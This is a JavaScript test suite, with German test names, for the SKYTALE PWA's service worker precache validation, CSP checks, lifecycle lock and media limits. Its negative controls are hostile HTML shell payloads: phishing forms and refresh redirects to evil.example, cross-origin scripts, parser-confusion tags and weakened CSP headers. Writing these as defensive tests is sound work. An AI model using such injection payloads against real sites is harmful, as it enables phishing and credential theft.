// PWA lifecycle + cache-consent + media resource guards.
// Each security property includes a bug-shaped negative control.
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import * as S from './.bundle/entry.js';

let pass = 0, fail = 0;
const ok = (name, condition) => {
  if (condition) {
    pass++;
    console.log('  ok  ', name);
  } else {
    fail++;
    console.log('  FAIL', name);
  }
};

console.log('\n[PWA: background wall clock + privacy curtain]');
const hiddenAt = 10_000;
ok('vor Ablauf der Grace-Period bleibt der Tresor offen',
  !S.backgroundLockExpired(hiddenAt, hiddenAt + 29_999, 30_000));
ok('bei exakt 30 s ist die Wall-clock-Sperre fällig',
  S.backgroundLockExpired(hiddenAt, hiddenAt + 30_000, 30_000));
ok('Resume nach eingefrorenem 5-Minuten-Timer sperrt trotzdem',
  S.backgroundLockExpired(hiddenAt, hiddenAt + 5 * 60_000, 30_000));
// NEGATIVE CONTROL: the old visible-handler only canceled its suspended timer.
const oldTimerOnlyWouldLock = false;
ok('Negativkontrolle: alter timer-only Resume hätte NICHT gesperrt',
  oldTimerOnlyWouldLock === false && S.backgroundLockExpired(hiddenAt, hiddenAt + 5 * 60_000, 30_000));
ok('ohne vorheriges hidden-Ereignis gibt es keinen falschen Lock',
  !S.backgroundLockExpired(null, hiddenAt + 60_000, 30_000));

const root = join(dirname(fileURLToPath(import.meta.url)), '..');
const appSource = readFileSync(join(root, 'src', 'App.tsx'), 'utf8');
const cssSource = readFileSync(join(root, 'src', 'app.css'), 'utf8');
ok('App setzt den Curtain synchron im Lifecycle-Handler',
  appSource.includes("classList.add('privacy-curtain-on')"));
ok('Hide/Freeze invalidiert auch laufende Argon2-/WebAuthn-Ergebnisse',
  appSource.includes('lifecycleEpochRef.current++') &&
  appSource.includes('lifecycleEpochRef.current !== expectedLifecycleEpoch'));
ok('BFCache-Rückkehr räumt den Curtain über pageshow kontrolliert auf',
  appSource.includes("window.addEventListener('pageshow', onPageShow)"));
ok('Curtain ist blickdicht und liegt über allen App-Overlays',
  /\.privacy-curtain\s*\{[\s\S]*?z-index:\s*10000[\s\S]*?background:\s*#0b0c0e/.test(cssSource));

console.log('\n[PWA: wartender Worker besitzt einen privaten Build-Cache]');
const manifestA = [
  { url: '/assets/app-a.js', revision: null },
  { url: '/index.html', revision: 'html-a' },
];
const manifestAReordered = [...manifestA].reverse();
const manifestB = [
  { url: '/assets/app-b.js', revision: null },
  { url: '/index.html', revision: 'html-b' },
];
const cacheA = await S.versionedPrecacheName('build-1', manifestA);
const cacheA2 = await S.versionedPrecacheName('build-1', manifestAReordered);
const cacheB = await S.versionedPrecacheName('build-2', manifestB);
ok('Manifest-Reihenfolge ändert den Cache-Namen nicht', cacheA === cacheA2);
ok('anderer Build/Manifest erhält einen anderen Cache', cacheA !== cacheB);
ok('nur SKYTALE-Precache-Namen werden als Altbuild erkannt',
  S.isScytalePrecache(cacheA) &&
  S.isScytalePrecache('scytale-precache') &&
  !S.isScytalePrecache('third-party-cache'));

const stored = new Map();
const cache = { put: async (key, response) => stored.set(String(key), response) };
const revision = async (body) => {
  const digest = new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(body)));
  return [...digest].map((byte) => byte.toString(16).padStart(2, '0')).join('');
};
const goodManifest = [
  { url: '/index.html', revision: await revision('<!doctype html>') },
  { url: '/assets/app.js', revision: await revision('export{}') },
  { url: '/assets/app.css', revision: await revision('body') },
];
const cleanShell =
  '<!doctype html><html lang="de"><head>' +
  '<title>SKYTALE</title>' +
  '<script type="module" crossorigin src="/assets/app.js"></script>' +
  '<link rel="stylesheet" crossorigin href="/assets/app.css"></head>' +
  '<body><div id="app"></div></body></html>';
const strictCsp =
  "default-src 'self'; base-uri 'self'; object-src 'none'; frame-ancestors 'none'; " +
  "form-action 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; " +
  "img-src 'self' data: blob:; media-src 'self' blob:; font-src 'self'; connect-src 'self'; " +
  "worker-src 'self'; manifest-src 'self'";
const shellResponse = (body, csp = strictCsp) => {
  const headers = { 'content-type': 'text/html' };
  if (csp !== null) headers['content-security-policy'] = csp;
  return new Response(body, { headers });
};
const refreshingShellResponse = (body) => {
  const response = shellResponse(body);
  const headers = new Headers(response.headers);
  headers.set('refresh', '0; url=https://evil.example/login');
  return new Response(body, { headers });
};
const fetchGood = async (path) => {
  if (path === '/') return shellResponse(cleanShell);
  if (path.endsWith('.js')) return new Response('export{}', { headers: { 'content-type': 'text/javascript' } });
  return new Response('body', { headers: { 'content-type': 'text/css' } });
};
await S.populateBuildPrecache(cache, goodManifest, fetchGood);
ok('vollständiger Build enthält Shell + alle Pflichtassets',
  stored.has('/index.html') && stored.has('/assets/app.js') && stored.has('/assets/app.css'));
ok('streng gelieferte CSP bleibt auf der gecachten Shell erhalten',
  stored.get('/index.html')?.headers.get('content-security-policy') === strictCsp);
const workboxRelativeManifest = goodManifest.map((entry) => ({
  ...entry,
  url: entry.url.slice(1),
}));
const relativeStored = new Map();
await S.populateBuildPrecache(
  { put: async (key, response) => relativeStored.set(String(key), response) },
  workboxRelativeManifest,
  fetchGood,
);
ok('Workbox-relative Manifestpfade werden kanonisch root-relativ gecacht',
  relativeStored.has('/index.html') &&
  relativeStored.has('/assets/app.js') &&
  relativeStored.has('/assets/app.css'));

let suffixedShellMimeRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => {
      if (path !== '/') return fetchGood(path);
      return new Response(cleanShell, {
        headers: {
          'content-type': 'text/html+evil',
          'content-security-policy': strictCsp,
        },
      });
    },
  );
} catch {
  suffixedShellMimeRejected = true;
}
ok('HTML-Subtyp-Suffix kann keine nicht ausführbare Shell als HTML tarnen',
  suffixedShellMimeRejected);

let suffixedScriptMimeRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path.endsWith('.js')
      ? new Response('export{}', { headers: { 'content-type': 'text/javascript+evil' } })
      : fetchGood(path),
  );
} catch {
  suffixedScriptMimeRejected = true;
}
ok('JavaScript-Subtyp-Suffix kann ein nicht ausführbares Buildasset nicht tarnen',
  suffixedScriptMimeRejected);

const utf8ShellStore = new Map();
await S.populateBuildPrecache(
  { put: async (key, response) => utf8ShellStore.set(String(key), response) },
  goodManifest,
  async (path) => path === '/'
    ? new Response(cleanShell, {
      headers: {
        'content-type': 'text/html; charset=UTF-8',
        'content-security-policy': strictCsp,
      },
    })
    : fetchGood(path),
);
ok('explizites UTF-8 bleibt als eindeutiger Shell-Charset zulässig',
  utf8ShellStore.has('/index.html'));

let utf16ShellRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path === '/'
      ? new Response(cleanShell, {
        headers: {
          'content-type': 'text/html; charset=utf-16',
          'content-security-policy': strictCsp,
        },
      })
      : fetchGood(path),
  );
} catch {
  utf16ShellRejected = true;
}
ok('abweichender HTTP-Charset kann Validator und Browser nicht entkoppeln',
  utf16ShellRejected);

let attachedShellRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path === '/'
      ? new Response(cleanShell, {
        headers: {
          'content-type': 'text/html',
          'content-security-policy': strictCsp,
          'content-disposition': 'attachment; filename="index.html"',
        },
      })
      : fetchGood(path),
  );
} catch {
  attachedShellRejected = true;
}
ok('Content-Disposition kann eine validierte Shell nicht zum Download umdeuten',
  attachedShellRejected);

let attachedScriptRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path.endsWith('.js')
      ? new Response('export{}', {
        headers: {
          'content-type': 'text/javascript',
          'content-disposition': 'attachment; filename="app.js"',
        },
      })
      : fetchGood(path),
  );
} catch {
  attachedScriptRejected = true;
}
ok('Content-Disposition kann ein verifiziertes App-Modul nicht unstartbar cachen',
  attachedScriptRejected);

const cspAllowsInstall = async (csp) => {
  try {
    await S.populateBuildPrecache(
      { put: async () => undefined },
      goodManifest,
      async (path) => path === '/' ? shellResponse(cleanShell, csp) : fetchGood(path),
    );
    return true;
  } catch {
    return false;
  }
};
ok("strikte script-src 'self' + 'wasm-unsafe-eval' wird dynamisch akzeptiert",
  await cspAllowsInstall(strictCsp));
ok('fehlende CSP lässt die Shell-Installation dynamisch scheitern',
  !(await cspAllowsInstall(null)));
ok('default-src ohne explizite script-src reicht nicht als Shell-Vertrauensanker',
  !(await cspAllowsInstall("default-src 'self'")));
ok("'unsafe-inline' in script-src lässt die Shell-Installation scheitern",
  !(await cspAllowsInstall("default-src 'self'; script-src 'self' 'wasm-unsafe-eval' 'unsafe-inline'")));
ok("'unsafe-eval' in script-src lässt die Shell-Installation scheitern",
  !(await cspAllowsInstall("default-src 'self'; script-src 'self' 'wasm-unsafe-eval' 'unsafe-eval'")));
ok('Unicode-Leerraum kann den Validator nicht von Chromiums CSP-Parser abkoppeln',
  !(await cspAllowsInstall(strictCsp.replaceAll(' ', '\u00a0'))));
ok('fremde Script-Origin in der CSP lässt die Shell-Installation scheitern',
  !(await cspAllowsInstall("default-src 'self'; script-src 'self' 'wasm-unsafe-eval' https://evil.example")));
ok('schwaches script-src-elem kann die geprüfte script-src-Regel nicht überschreiben',
  !(await cspAllowsInstall(
    `${strictCsp}; script-src-elem https://evil.example`,
  )));
ok('frame-src darf default-src nicht nachträglich für Phishing-Frames überschreiben',
  !(await cspAllowsInstall(
    `${strictCsp}; frame-src https://evil.example`,
  )));
ok('style-src-elem darf die geprüfte Style-Policy nicht nachträglich überschreiben',
  !(await cspAllowsInstall(
    `${strictCsp}; style-src-elem *`,
  )));
ok('striktes script-src allein reicht bei schwacher Form/Object/Base-Policy nicht',
  !(await cspAllowsInstall(
    "default-src *; base-uri *; object-src *; frame-ancestors *; form-action *; " +
    "script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: blob:; media-src 'self' blob:; font-src 'self'; connect-src 'self'; " +
    "worker-src 'self'; manifest-src 'self'",
  )));
ok('fehlende form-action/base-uri/frame-ancestors Direktiven werden fail-closed abgelehnt',
  !(await cspAllowsInstall(
    "default-src 'self'; object-src 'none'; script-src 'self' 'wasm-unsafe-eval'; " +
    "style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; " +
    "font-src 'self'; connect-src 'self'; worker-src 'self'; manifest-src 'self'",
  )));

let wrongTypeRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    [
      { url: '/index.html', revision: await revision('<!doctype html>') },
      { url: '/assets/missing.js', revision: await revision('export{}') },
    ],
    async (path) => path === '/'
      ? shellResponse('<!doctype html>')
      : new Response('<!doctype html>', { headers: { 'content-type': 'text/html' } }),
  );
} catch {
  wrongTypeRejected = true;
}
ok('SPA-HTML unter fehlender JS-URL lässt Installation scheitern', wrongTypeRejected);
// NEGATIVE CONTROL: the old best-effort cache.add(...catch) accepted this 200.
ok('Negativkontrolle: ein bloßer response.ok-Check hätte den Defekt akzeptiert',
  new Response('<html>').ok && wrongTypeRejected);

let mixedBuildRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path === '/'
      ? shellResponse('<!doctype html><script src="/assets/app-b.js"></script>')
      : fetchGood(path),
  );
} catch {
  mixedBuildRejected = true;
}
ok('Shell eines zwischenzeitlich gewechselten Deployments wird über die Struktur-Prüfung abgelehnt', mixedBuildRejected);

// REGRESSION (fleet freeze, v0.30): Cloudflare "JavaScript Detections" injects a PER-REQUEST
// inline challenge script into the HTML shell, so its bytes never match a build-time hash. The
// old exact-SHA shell check threw on EVERY client → no device could activate the new SW. The
// structural check must ACCEPT it: the injected inline script is CSP-inert and the shell still
// boots only the verified module.
const injectedShell =
  '<!doctype html><html lang="de"><head>' +
  '<title>SKYTALE</title>' +
  '<script type="module" crossorigin src="/assets/app.js"></script>' +
  '<link rel="stylesheet" crossorigin href="/assets/app.css"></head>' +
  '<body><div id="app"></div>' +
  "<script>window.__CF$cv$params={r:'a21e',t:'MTc4NQ=='};(function(){var s=document.createElement('script');s.src='/cdn-cgi/challenge-platform/scripts/precursor/main.js';document.head.appendChild(s);})();</script>" +
  '</body></html>';
const injectedStore = new Map();
let injectedInstalled = false;
try {
  await S.populateBuildPrecache(
    { put: async (key, response) => injectedStore.set(String(key), response) },
    goodManifest,
    async (path) => (path === '/'
      ? shellResponse(injectedShell)
      : fetchGood(path)),
  );
  injectedInstalled = injectedStore.has('/index.html') && injectedStore.has('/assets/app.js');
} catch {
  injectedInstalled = false;
}
ok('Edge-injizierte Shell (CF-Challenge-Script) installiert dennoch — kein Fleet-Freeze', injectedInstalled === true);
// NEGATIVE CONTROL: the injected shell's bytes differ from the clean shell, so a byte-exact
// check would have rejected exactly this — the failure that froze every client at v0.30.
ok('Negativkontrolle: eine byte-genaue Shell-Prüfung hätte die injizierte Shell verworfen',
  injectedInstalled && (await revision(injectedShell)) !== (await revision(cleanShell)));

let injectedFormRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path === '/'
      ? shellResponse(cleanShell.replace(
          '<div id="app"></div>',
          '<form action="https://evil.example"><input name="passphrase"></form><div id="app"></div>',
        ))
      : fetchGood(path),
  );
} catch {
  injectedFormRejected = true;
}
ok('scriptloses injiziertes Passwort-Formular wird strukturell abgelehnt',
  injectedFormRejected);

let injectedRefreshRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path === '/'
      ? shellResponse(cleanShell.replace(
          '<div id="app"></div>',
          '<meta http-equiv="refresh" content="0;url=https://evil.example/login"><div id="app"></div>',
        ))
      : fetchGood(path),
  );
} catch {
  injectedRefreshRejected = true;
}
ok('injiziertes Meta-Refresh kann die PWA nicht zu einer Passphrase-Phishingseite navigieren',
  injectedRefreshRejected);

let injectedRefreshHeaderRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path === '/' ? refreshingShellResponse(cleanShell) : fetchGood(path),
  );
} catch {
  injectedRefreshHeaderRejected = true;
}
ok('injizierter HTTP-Refresh-Header kann die PWA nicht zu einer Phishingseite navigieren',
  injectedRefreshHeaderRejected);

let injectedImageMapRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path === '/'
      ? shellResponse(cleanShell.replace(
          '<div id="app"></div>',
          '<img usemap="#login" src="data:image/svg+xml,%3Csvg/%3E">' +
          '<map name="login"><area shape="rect" coords="0,0,1000,1000" ' +
          'href="https://evil.example/login"></map><div id="app"></div>',
        ))
      : fetchGood(path),
  );
} catch {
  injectedImageMapRejected = true;
}
ok('injizierte Image-Map kann keinen CSP-unbegrenzten Top-Level-Login öffnen',
  injectedImageMapRejected);

let abruptCommentPhishRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path === '/'
      ? shellResponse(cleanShell.replace(
          '<div id="app"></div>',
          '<!--><form id="phish"><input name="passphrase"></form>--><div id="app"></div>',
        ))
      : fetchGood(path),
  );
} catch {
  abruptCommentPhishRejected = true;
}
ok('HTML-Parser-Fehlererholung kann kein aus Regex-Sicht kommentiertes Formular aktivieren',
  abruptCommentPhishRejected);

let fakeScriptTagPhishRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path === '/'
      ? shellResponse(cleanShell.replace(
          '<div id="app"></div>',
          '<script:fake><form id="phish"><input name="passphrase"></form>' +
          '</script><div id="app"></div>',
        ))
      : fetchGood(path),
  );
} catch {
  fakeScriptTagPhishRejected = true;
}
ok('ein script-Präfix-Tag kann aktive Formulare nicht aus der Strukturprüfung ausblenden',
  fakeScriptTagPhishRejected);

let malformedScriptCloseRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path === '/'
      ? shellResponse(cleanShell.replace(
          '<div id="app"></div>',
          '<script>0</script x><form id="phish"><input name="passphrase"></form>' +
          '<script>0</script><div id="app"></div>',
        ))
      : fetchGood(path),
  );
} catch {
  malformedScriptCloseRejected = true;
}
ok('Browser-Rawtext-Recovery an einem mehrdeutigen script-End-Tag wird abgelehnt',
  malformedScriptCloseRejected);

let unicodeScriptSeparatorRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path === '/'
      ? shellResponse(cleanShell.replace(
          '<div id="app"></div>',
          '<script\u00a0><form id="phish"><input name="passphrase"></form>' +
          '</script><div id="app"></div>',
        ))
      : fetchGood(path),
  );
} catch {
  unicodeScriptSeparatorRejected = true;
}
ok('Unicode-Leerraum kann kein unbekanntes script-Präfix als Rawtext tarnen',
  unicodeScriptSeparatorRejected);

let visibleBodyTextRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path === '/'
      ? shellResponse(cleanShell.replace(
          '<div id="app"></div>',
          'SKYTALE-Sicherheitsprüfung: Passwort erneut eingeben<div id="app"></div>',
        ))
      : fetchGood(path),
  );
} catch {
  visibleBodyTextRejected = true;
}
ok('injizierter sichtbarer Body-Text kann keine Branding-/Phishing-UI vortäuschen',
  visibleBodyTextRejected);

let styledBodyRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path === '/'
      ? shellResponse(cleanShell.replace('<body>', '<body style="position:fixed;inset:0">'))
      : fetchGood(path),
  );
} catch {
  styledBodyRejected = true;
}
ok('Attribute am Body können die App-Shell nicht überdecken oder umgestalten',
  styledBodyRejected);

let unverifiedManifestRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path === '/'
      ? shellResponse(cleanShell.replace(
          '</head>',
          '<link rel="manifest" href="/attacker.webmanifest"></head>',
        ))
      : fetchGood(path),
  );
} catch {
  unverifiedManifestRejected = true;
}
ok('ein nicht manifestverifiziertes Web-App-Manifest wird abgelehnt',
  unverifiedManifestRejected);

let alteredTitleRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path === '/'
      ? shellResponse(cleanShell.replace('<title>SKYTALE</title>', '<title>Bank Login</title>'))
      : fetchGood(path),
  );
} catch {
  alteredTitleRejected = true;
}
ok('ein manipulierter Produkttitel wird abgelehnt',
  alteredTitleRejected);

const spacedTagNames = [
  cleanShell.replace('</title>', '</ title>'),
  cleanShell.replace('<html', '< html'),
];
const spacedTagNamesRejected = await Promise.all(spacedTagNames.map(async (shell) => {
  try {
    await S.populateBuildPrecache(
      { put: async () => undefined },
      goodManifest,
      async (path) => path === '/' ? shellResponse(shell) : fetchGood(path),
    );
    return false;
  } catch {
    return true;
  }
}));
ok('Leerraum vor Start-/End-Tag-Namen kann Browser und Validator nicht entkoppeln',
  spacedTagNamesRejected.every(Boolean));

// A shell that pulls a CROSS-ORIGIN script is refused (belt-and-suspenders over the CSP).
let crossOriginRejected = false;
try {
  await S.populateBuildPrecache({ put: async () => undefined }, goodManifest,
    async (path) => (path === '/'
      ? shellResponse('<!doctype html><script type="module" src="https://evil.example/x.js"></script>')
      : fetchGood(path)));
} catch { crossOriginRejected = true; }
ok('Shell mit Fremd-Origin-Script wird abgelehnt', crossOriginRejected);

// The parser's synthetic URL base is not the real document origin. An absolute
// reference to that dummy host must therefore never count as same-origin.
let syntheticBaseOriginRejected = false;
try {
  await S.populateBuildPrecache(
    { put: async () => undefined },
    goodManifest,
    async (path) => path === '/'
      ? shellResponse(cleanShell
        .replace('/assets/app.js', 'https://local.invalid/assets/app.js')
        .replace('/assets/app.css', 'https://local.invalid/assets/app.css'))
      : fetchGood(path),
  );
} catch {
  syntheticBaseOriginRejected = true;
}
ok('absolute URL zum Parser-Dummy-Origin wird als cross-origin abgelehnt',
  syntheticBaseOriginRejected);

const ambiguousShellRefs = [
  '//local.invalid/assets/app.js',
  '/\\local.invalid/assets/app.js',
  '/assets/../assets/app.js',
];
const ambiguousShellRefsRejected = await Promise.all(ambiguousShellRefs.map(async (ref) => {
  try {
    await S.populateBuildPrecache(
      { put: async () => undefined },
      goodManifest,
      async (path) => path === '/'
        ? shellResponse(cleanShell.replace('/assets/app.js', ref))
        : fetchGood(path),
    );
    return false;
  } catch {
    return true;
  }
}));
ok('Authority-, Backslash- und Dot-Segment-URL-Differenzen werden abgelehnt',
  ambiguousShellRefsRejected.every(Boolean));

// A shell that references a same-origin script we did NOT byte-verify is refused.
let unverifiedRefRejected = false;
try {
  await S.populateBuildPrecache({ put: async () => undefined }, goodManifest,
    async (path) => (path === '/'
      ? shellResponse('<!doctype html><script type="module" src="/assets/not-in-manifest.js"></script>')
      : fetchGood(path)));
} catch { unverifiedRefRejected = true; }
ok('Shell mit nicht verifizierter same-origin Ressource wird abgelehnt', unverifiedRefRejected);

// A shell that boots NO verified module is refused (never cache a shell that can't start).
let noModuleRejected = false;
try {
  await S.populateBuildPrecache({ put: async () => undefined }, goodManifest,
    async (path) => (path === '/'
      ? shellResponse('<!doctype html><link rel="stylesheet" href="/assets/app.css"></head>')
      : fetchGood(path)));
} catch { noModuleRejected = true; }
ok('Shell ohne verifiziertes App-Modul wird abgelehnt', noModuleRejected);

const swSource = readFileSync(join(root, 'src', 'sw.ts'), 'utf8');
const attachmentSource = readFileSync(join(root, 'src', 'Attachment.tsx'), 'utf8');
const attachmentStoreSource = readFileSync(join(root, 'src', 'lib', 'attachments.ts'), 'utf8');
ok('Service Worker nutzt den versionierten Namen tatsächlich',
  swSource.includes('versionedPrecacheName(__BUILD_HASH__, manifest)'));
ok('fehlgeschlagener Install löscht den privaten Kandidaten und wirft weiter',
  /caches\.delete\(cacheName\)[\s\S]*?throw error/.test(swSource));
// The runtime fetch handler is the fleet's trust boundary: it must serve only cached, verified bytes
// and NEVER fall through to the live network (a compromised deploy could otherwise inject script).
// The old assertion was a lax `script ... cacheUnavailable` regex that stayed green even if a fetch()
// were spliced into the miss path; anchor on the whole handler instead.
const fetchHandler = swSource.slice(
  swSource.indexOf("sw.addEventListener('fetch'"),
  swSource.indexOf("sw.addEventListener('push'"),
);
ok('SW-fetch-Handler ruft zur Laufzeit NIE fetch() — kein Live-Netz für Shell/Assets',
  fetchHandler.length > 0 && !/\bfetch\s*\(/.test(fetchHandler));
ok('Executable-Miss: Geschwister-Precache, sonst fail-closed (kein Netz-Fallthrough)',
  /findInAnyScytalePrecache\(req\)\) \?\? cacheUnavailable\(\)/.test(fetchHandler) &&
  /req\.destination === 'script' \|\| req\.destination === 'style' \|\| req\.destination === 'worker'/.test(fetchHandler));
ok('Asset-Reihenfolge: aktiver Precache zuerst, dann Cross-Precache, dann fail-closed',
  /cache\.match\(req\)\) \?\? \(await findInAnyScytalePrecache\(req\)\) \?\? cacheUnavailable\(\)/.test(fetchHandler));
ok('Navigation → cachedShell() (nie Netz)', /req\.mode === 'navigate'[\s\S]*?cachedShell\(\)/.test(fetchHandler));
// NEGATIVE CONTROL: a network fallthrough in the miss path would flip the no-fetch invariant to FAIL.
const handlerWithNetworkFallthrough = fetchHandler.replace('cacheUnavailable()', 'fetch(req)');
ok('Negativkontrolle: ein fetch(req)-Fallthrough im Handler bräche die kein-Netz-Invariante',
  /\bfetch\s*\(/.test(handlerWithNetworkFallthrough));
ok('alter globale Cache-Name ist entfernt', !swSource.includes("const PRECACHE = 'scytale-precache'"));
ok('Update-Prompt wird nicht fälschlich als Origin-Trust-Boundary dokumentiert',
  swSource.includes('this prompt is release UX, not a trust boundary') &&
  !swSource.includes('must change ONLY when they explicitly accept'));

// ── Behavioral: cross-precache lookup serves verified bytes, never the network ──
// Drives the REAL findInAnyScytalePrecache against a stubbed Cache Storage. This is the extracted
// core of the fetch handler's build-skew fix; a source regex can't prove it stays read-only.
console.log('\n[SW: Cross-Precache-Lookup — Verhalten + kein Netz]');
{
  const ACTIVE = 'scytale-precache-buildA-aaaa';
  const SIBLING = 'scytale-precache-buildB-bbbb';
  const CONTROL = 'scytale-control-v1'; // push-control cache — NOT a scytale precache
  const assetUrl = 'https://skytale.test/assets/app-abc123.js';
  const mkResp = (label) => new Response(label, { status: 200 });
  // A CacheStorage stub: caches.open is create-if-absent (matches the platform + our litter note).
  const makeCaches = (store) => ({
    keys: async () => [...store.keys()],
    open: async (name) => {
      if (!store.has(name)) store.set(name, new Map());
      const entries = store.get(name);
      return { match: async (r) => entries.get(typeof r === 'string' ? r : r.url) };
    },
  });

  const savedCaches = globalThis.caches;
  const savedFetch = globalThis.fetch;
  let fetchCalls = 0;
  globalThis.fetch = () => {
    fetchCalls++;
    throw new Error('findInAnyScytalePrecache darf NIE ins Live-Netz greifen');
  };

  // CONTROL is inserted FIRST and holds a poisoned copy at the same URL. If the lookup wrongly
  // trusted non-precache caches we would get 'CONTROL-poison'; getting 'SIBLING-asset' proves the
  // isScytalePrecache filter holds AND that a sibling build's precache satisfies an active-cache miss.
  const store1 = new Map();
  store1.set(CONTROL, new Map([[assetUrl, mkResp('CONTROL-poison')]]));
  store1.set(SIBLING, new Map([[assetUrl, mkResp('SIBLING-asset')]]));
  store1.set(ACTIVE, new Map()); // active precache present but lacks the concurrent build's hashed asset
  globalThis.caches = makeCaches(store1);
  const hit = await S.findInAnyScytalePrecache(new Request(assetUrl));
  ok('Miss im aktiven Precache wird aus Geschwister-scytale-Precache bedient',
    hit !== undefined && (await hit.text()) === 'SIBLING-asset');

  // Asset present in NO scytale precache → undefined, and the network is never touched.
  const store2 = new Map();
  store2.set(ACTIVE, new Map());
  store2.set(SIBLING, new Map());
  globalThis.caches = makeCaches(store2);
  const miss = await S.findInAnyScytalePrecache(new Request(assetUrl));
  ok('Asset in keiner scytale-Precache → undefined (Caller fällt fail-closed)', miss === undefined);
  ok('Negativkontrolle: Cross-Precache-Lookup ruft NIE fetch() (kein Live-Netz)', fetchCalls === 0);

  // NEGATIVE CONTROL: the very same asset present ONLY in the non-precache control cache stays a miss.
  const store3 = new Map();
  store3.set(CONTROL, new Map([[assetUrl, mkResp('CONTROL-poison')]]));
  globalThis.caches = makeCaches(store3);
  const controlOnly = await S.findInAnyScytalePrecache(new Request(assetUrl));
  ok('Negativkontrolle: Asset nur im control-Cache → Miss (nur scytale-Precaches werden vertraut)',
    controlOnly === undefined);

  globalThis.caches = savedCaches;
  globalThis.fetch = savedFetch;
}

console.log('\n[Medien: automatische Voll-Decodes sind begrenzt]');
ok('normales Bild bleibt inline',
  S.mayRenderInlineImage('image/jpeg', S.MAX_INLINE_IMAGE_BYTES));
ok('übergroßes Bild wird nicht automatisch an den Bilddecoder gegeben',
  !S.mayRenderInlineImage('image/jpeg', S.MAX_INLINE_IMAGE_BYTES + 1));
ok('kleine Audiodatei darf eine Waveform erhalten',
  S.mayAnalyzeAudio(S.MAX_AUDIO_ANALYSIS_BYTES));
ok('übergroße Audiodatei überspringt arrayBuffer/decodeAudioData',
  !S.mayAnalyzeAudio(S.MAX_AUDIO_ANALYSIS_BYTES + 1));
// NEGATIVE CONTROL: the old policy keyed solely off attacker-controlled MIME.
const oldMimeOnly = (mime) => mime.startsWith('image/');
ok('Negativkontrolle: alte MIME-only-Policy hätte 1 GB inline geparst',
  oldMimeOnly('image/jpeg') && !S.mayRenderInlineImage('image/jpeg', 1024 ** 3));
ok('große gespeicherte Anhänge werden nicht zu einem JS-Blob materialisiert',
  attachmentStoreSource.includes('MAX_MATERIALIZED_ATTACHMENT_BYTES') &&
  attachmentStoreSource.includes('AttachmentMaterializationLimitError'));
ok('große Anhänge nutzen nur einen expliziten Streaming-Dateiexport',
  attachmentSource.includes('saveAttachmentToDisk') &&
  attachmentStoreSource.includes('await writable.write(plain)'));

console.log(`\n${pass} ok, ${fail} fail`);
process.exit(fail ? 1 : 0);
